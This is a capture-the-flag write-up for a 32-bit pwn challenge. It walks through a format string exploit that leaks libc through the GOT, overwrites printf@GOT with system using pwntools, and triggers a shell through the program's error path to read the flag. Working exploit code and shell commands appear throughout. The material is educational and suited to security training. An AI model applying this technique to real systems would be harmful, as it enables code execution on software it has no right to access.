# Brick City Office Space

**Category:** Pwn | **Difficulty:** Easy | **Flag:** `UMASS{th3-f0rm4t_15-0ff-th3-ch4rt5}`

## TL;DR

Classic format string exploit on a 32-bit binary with no RELRO. We leak libc via a GOT dereference, overwrite `printf@GOT` with `system`, then trick the error path into calling `system("sh")` to get a shell.

## What We're Given

A zip containing a 32-bit ELF binary called `BrickCityOfficeSpace`, along with `libc.so.6` and `ld-linux.so.2` (the exact glibc 2.35 the remote uses). The challenge also provides a remote service at `brick-city-office-space.pwn.ctf.umasscybersec.org:45001`.

The name is a riff on the movie *Office Space*, which is a hint that something boring and office-themed is about to go very wrong.

## Initial Recon

First things first — `checksec` to see what defenses we're dealing with:

```
Arch:       i386-32-little
RELRO:      No RELRO
Stack:      No canary found
NX:         NX enabled
PIE:        No PIE (0x8048000)
```

`checksec` is like running a quick "what locks are on the door?" check before trying to break in. Here's what each line means for us:

- **No RELRO** — the GOT (Global Offset Table, where the binary stores resolved library function addresses) is fully writable. We can overwrite function pointers there.
- **No canary** — no stack cookie protecting against overflows. Not our attack path here, but nice to know.
- **NX enabled** — we can't execute shellcode on the stack. We'll need to use existing code (ret2libc / GOT overwrite style).
- **No PIE** — the binary loads at a fixed address (`0x8048000`) every time. No ASLR to fight on the binary side.

Next, we decompile the binary. The program prints some ASCII art of a building and asks you to submit your own "office design." The key flow inside `vuln()`:

1. Read up to 0x250 bytes into a stack buffer via `fgets()`
2. Call `printf(&buffer)` to display it — **directly passing user input as the format string**
3. Ask "Would you like to redesign? (y/n)"
4. If `y` or `Y`: loop back and do it again
5. If `n` or `N`: break out
6. **Otherwise** (any other input): print an error message, then call `printf(&answer_buffer)` again with whatever you typed, then `exit(0)`

That last branch is the golden ticket. Two separate `printf()` calls with user-controlled data, and the second one fires with whatever you typed as the y/n answer. This is the trigger for our shell.

## The Vulnerability / Trick

This is a **format string vulnerability** — specifically, the classic `printf(user_input)` mistake instead of the safe `printf("%s", user_input)`.

Here's why this is dangerous: `printf` takes a format string like `"Hello %s, you have %d messages"` and expects to find corresponding values on the stack. When you pass user input directly as the format string, the attacker controls what `printf` looks for. This means:

- `%x` — read values off the stack (info leak)
- `%s` — dereference a pointer and print the string at that address (controlled info leak)
- `%n` — write the number of bytes printed so far to a pointer (arbitrary write!)

Combined with **No RELRO**, which means the GOT is writable, we have everything we need:

1. Leak a libc address by reading through the GOT with `%s`
2. Use `%n`-style writes to overwrite `printf@GOT` with the address of `system()`
3. When the program later calls `printf(our_input)`, it actually calls `system(our_input)`

This is a textbook "GOT overwrite via format string" attack. If you want to deep-dive the mechanics, LiveOverflow's [format string series](https://www.youtube.com/watch?v=0WvrSfcdq1I) is excellent.

### Why the stack offset matters

In 32-bit x86, `printf` reads its arguments off the stack. Our buffer starts at stack argument position 4 (after the three saved registers at the top). That means `%4$s` will read the 4th argument — which is right where our buffer starts. So if we put an address at the beginning of our buffer, `%4$s` will dereference it. Convenient.

## Building the Exploit

The exploit runs in three stages. Let's walk through each one.

### Stage 1: Leak libc

We need to know where libc is loaded in memory so we can compute the address of `system()`. ASLR randomizes this each run, but we can leak it by abusing `%s` to read through the GOT.

```python
payload = p32(elf.got['puts']) + b'LEAK%4$s'
io.sendline(payload)
```

Here's what's happening: we put the address of `puts@GOT` (a 4-byte address in the GOT that holds the runtime address of `puts` in libc) at the start of our buffer. Then `LEAK` is just a marker so we know where to start parsing the output. Finally, `%4$s` tells `printf` to read the 4th stack argument as a pointer and print the string there — but since the 4th argument IS our buffer, it dereferences `puts@GOT` and gives us the real runtime address of `puts`.

```python
io.recvuntil(b'LEAK')
leaked = io.recvuntil(b'\n', drop=True)
puts_addr = u32(leaked[:4])
libc.address = puts_addr - libc.sym['puts']
system_addr = libc.sym['system']
```

We parse the 4 leaked bytes, subtract the known offset of `puts` in the provided libc to get the libc base address, then add the offset of `system` to get where `system()` lives in memory right now.

### Stage 2: Overwrite printf@GOT

Now we answer `y` to get another design prompt, and this time we send a format string payload that writes `system_addr` into `printf@GOT`:

```python
payload = fmtstr_payload(4, {PRINTF_GOT: system_addr}, write_size='byte')
io.sendline(payload)
```

`fmtstr_payload` is pwntools' automatic format string exploit generator — we tell it:
- Stack offset is `4` (where our buffer starts)
- We want to write `system_addr` to the address `PRINTF_GOT`
- Write byte-by-byte (`write_size='byte'`) to avoid triggering issues with large `%n` writes

Pwntools figures out the exact `%c%c%...%n` sequence to make this happen. The payload comes out to 64 bytes — well within our 0x250 limit. After `printf` processes this, `printf@GOT` now points to `system()`.

### Stage 3: Trigger system("sh")

The program asks for y/n one more time. We send something that isn't y or n:

```python
io.sendline(b'sh')
```

The binary hits the error path:

```c
printf(&answer_buffer);  // now system(&answer_buffer) = system("sh\n")
```

`sh\n` is a valid shell command — `sh` spawns a shell, and the trailing newline is ignored. We have a shell.

```python
io.sendline(b'cat flag.txt 2>/dev/null; cat /home/*/flag.txt 2>/dev/null; cat /flag* 2>/dev/null')
print(io.recv(timeout=2))
io.interactive()
```

## Running It

```
$ python solve.py REMOTE
[*] puts@libc: 0xf7d952a0
[*] libc base: 0xf7d22000
[*] system: 0xf7d6a170
[*] fmtstr payload len: 64
b'UMASS{th3-f0rm4t_15-0ff-th3-ch4rt5}\n'
```

Clean. The three-stage chain fires perfectly: leak, overwrite, trigger.

## Key Takeaways

**The core technique:** Format string + No RELRO = GOT overwrite. This is one of the most common pwn challenge patterns, and it's worth having it memorized. Any time you see `printf(user_input)` with a writable GOT, you're looking at this attack.

**The "error path as trigger" trick:** The clever part of this challenge isn't the format string itself — it's how the shell gets triggered. Instead of returning to a gadget or doing a traditional ret2libc, we abuse the program's own error-handling code path. Sending something other than y/n causes the binary to call `printf` (now hijacked to `system`) on our input. Elegant.

**Tools worth remembering:**
- `checksec` — always run this first on pwn binaries, it tells you your attack surface instantly
- `pwntools fmtstr_payload` — automates the tedious math of format string writes so you can focus on the strategy
- `%N$s` syntax — the `$` lets you access arbitrary positional arguments in printf, which is what makes targeted GOT leaks possible

**The gotcha that bit us:** We first tried answering with `;sh` instead of `sh`. The leading semicolon confused the shell and gave a syntax error. When the program calls `system("sh")`, the whole string is the command — there's no prior command for `;sh` to chain onto. Pure `sh` is the right call.

**If you want to learn more:**
- [LiveOverflow's format string series](https://www.youtube.com/watch?v=0WvrSfcdq1I) — the definitive beginner intro
- [pwntools fmtstr docs](https://docs.pwntools.com/en/stable/fmtstr.html) — how the auto-payload generator works under the hood
- [ir0nstone's binary exploitation notes](https://ir0nstone.gitbook.io/notes/) — great GOT overwrite writeup in a structured format
